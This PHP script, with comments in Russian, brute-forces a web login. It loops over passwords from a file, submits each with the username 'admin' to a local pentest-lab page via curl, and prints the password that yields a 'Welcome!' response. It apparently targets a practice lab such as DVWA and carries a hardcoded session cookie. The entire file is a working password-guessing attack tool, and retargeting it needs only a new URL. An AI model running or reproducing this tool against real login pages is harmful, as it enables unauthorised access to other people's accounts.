<?php

set_time_limit(0);

// USE
$proxy = '192.168.100.249:8089';
$referer = $_GET['url']; //'';
$useragent = 'Mozilla/5.0 (Windows NT 5.1; rv:47.0) Gecko/20100101 Firefox/47.0';
$cookie = 'security=low;PHPSESSID=u7v49bp5sj4cg7k879pplqk6e4';

$login_str = '<p style="color: red">Welcome!</p>'; // Что ищем
$pass_arr = read_file_pass('pass.txt'); // пароли для перебора

for ($i = 0; $i < count($pass_arr); $i++){
	$url  = 'http://localhost/pentest/brute/reg.php?username=admin&password=';
	$url .= $pass_arr[$i];
	$url .= '&Login=Login';

	$html = get_curl($proxy, $url, $url, $useragent, $cookie); //Скачивание html страницы
	
	if (contains($login_str, $html, false)){ // Проверка на совпадение подстроки в строки
		echo 'Count: ' . $i. '. Password found: ' . $pass_arr[$i];
	}
}

/************************************************************/
function get_curl($proxy, $url, $referer, $useragent, $cookie){
	$ch = curl_init();
	//curl_setopt($ch, CURLOPT_PROXY, $proxy); //если нужен прокси
	curl_setopt($ch, CURLOPT_URL, $url); //куда шлем
	curl_setopt($ch, CURLOPT_REFERER, $referer);
	curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
	//curl_setopt($ch, CURLOPT_COOKIE, urlencode($cookie)); //файлы COOKIE
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_HEADER, 1); // показывать заголовки
	curl_setopt($ch, CURLOPT_NOBODY, 0);
	$result = curl_exec($ch);
	curl_close ($ch);

	return $result;
}
/************************************************************/

/************************************************************/
// Поиск подстроки в строке
function contains($str, $content, $ignorecase = true){
    if ($ignorecase){
        $str = strtolower($str);
        $content = strtolower($content);
    }
    return strpos($content,$str) ? true : false;
}
/************************************************************/


function read_file_pass($filename){
	
	if($fh = fopen($filename,"r")){ // Read file password
		
      while (!feof($fh)){
         $arr[] = trim(fgets($fh,1024));		  
      }
      fclose($fh);	  
    }
	return $arr;
}
?>
